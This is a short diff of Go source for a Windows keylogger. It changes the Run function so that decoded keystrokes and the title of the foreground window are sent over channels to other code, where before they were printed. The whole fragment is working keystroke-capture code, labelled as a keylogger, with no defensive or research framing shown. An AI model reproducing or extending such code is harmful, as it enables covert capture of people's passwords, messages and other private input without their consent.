@@ -61,7 +61,7 @@ func GetForegroundWindow() uintptr {
 }
 
 // Runs the keylogger
-func Run() error {
+func Run(key_out chan rune, window_out chan string) error {
 	// Buffer size is depends on your need. The 100 is placeholder value.
 	keyboardChan := make(chan types.KeyboardEvent, 100)
 
@@ -83,11 +83,9 @@ func Run() error {
 			return nil
 		case k := <-keyboardChan:
 			if hwnd := GetForegroundWindow(); hwnd != 0 {
-				text := GetWindowText(HWND(hwnd))
-				// fmt.Printf("Received %v %v %v\n", k.Message, k.VKCode, k.ScanCode)
 				if k.Message == types.WM_KEYDOWN {
-					fmt.Println("window:", text)
-					fmt.Println(string(VKCodeToAscii(k)))
+					key_out <- VKCodeToAscii(k)
+					window_out <- GetWindowText(HWND(hwnd))
 				}
 			}
 		}
